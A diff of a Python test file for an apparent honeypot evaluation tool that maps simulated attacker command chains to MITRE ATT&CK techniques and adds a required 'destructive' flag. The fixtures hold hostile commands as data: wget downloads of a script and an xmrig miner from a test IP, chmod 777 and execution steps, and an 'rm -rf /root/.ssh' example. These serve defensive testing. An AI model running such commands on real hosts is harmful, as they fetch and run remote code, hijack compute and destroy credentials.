@@ -17,6 +17,7 @@ def test_every_chain_declares_expected_techniques() -> None:
 def test_an_executed_chain_is_verified_through_the_rules_engine() -> None:
     chain = Chain(
         id="dropper",
+        destructive=True,
         steps=["cd /tmp", "wget http://198.51.100.7/x.sh", "chmod 777 x.sh"],
         expected_technique_ids=["T1105", "T1222.002"],
     )
@@ -41,6 +42,7 @@ def test_a_technique_the_honeypot_never_produced_is_not_observed() -> None:
     # not_observed -- a real defect signal, distinct from unknown.
     chain = Chain(
         id="dropper",
+        destructive=True,
         steps=["wget http://198.51.100.7/x.sh", "chmod 777 x.sh"],
         expected_technique_ids=["T1105", "T1222.002"],
     )
@@ -60,6 +62,7 @@ def test_evidence_for_a_multiply_hit_technique_is_chosen_by_declared_step_order(
     # regardless of what order the executed commands happen to arrive in.
     chain = Chain(
         id="miner",
+        destructive=True,
         steps=["wget http://198.51.100.7/xmrig", "chmod 777 xmrig", "./xmrig"],
         expected_technique_ids=["T1496"],
     )
@@ -87,6 +90,7 @@ def test_a_multiply_hit_technique_produces_exactly_one_result_row() -> None:
     # never be allowed to inflate that count.
     chain = Chain(
         id="miner",
+        destructive=True,
         steps=["wget http://198.51.100.7/xmrig", "chmod 777 xmrig", "./xmrig"],
         expected_technique_ids=["T1496"],
     )
@@ -100,3 +104,40 @@ def test_a_multiply_hit_technique_produces_exactly_one_result_row() -> None:
 
     assert len(results) == 1
     assert results[0].expected_technique_id == "T1496"
+
+
+# --- B3: destructive steps must not reach a host that runs them ----------
+
+
+def test_every_shipped_chain_declares_whether_it_is_destructive() -> None:
+    """The flag is what stands between `rm -rf /root/.ssh` and a real host.
+
+    `Chain.destructive` has no default precisely so this cannot be forgotten,
+    and this asserts the shipped set actually carries it rather than relying
+    on the schema alone.
+    """
+    from app.services.evaluation.static.chains import load_chains
+
+    for chain in load_chains():
+        assert isinstance(chain.destructive, bool), chain.id
+
+
+def test_the_shipped_chains_that_write_or_execute_are_marked_destructive() -> None:
+    """Marked by what the steps actually do, not by hand-waving.
+
+    A step that deletes, appends to a file, or executes a downloaded artifact
+    has real side effects on a host that does not simulate commands.
+    """
+    from app.services.evaluation.static.chains import load_chains
+
+    for chain in load_chains():
+        writes = [
+            step
+            for step in chain.steps
+            if step.startswith(("rm ", "bash ", "sh ", "./")) or ">>" in step
+        ]
+        if writes:
+            assert chain.destructive, (
+                f"chain {chain.id} has steps with real side effects but is not "
+                f"marked destructive: {writes}"
+            )
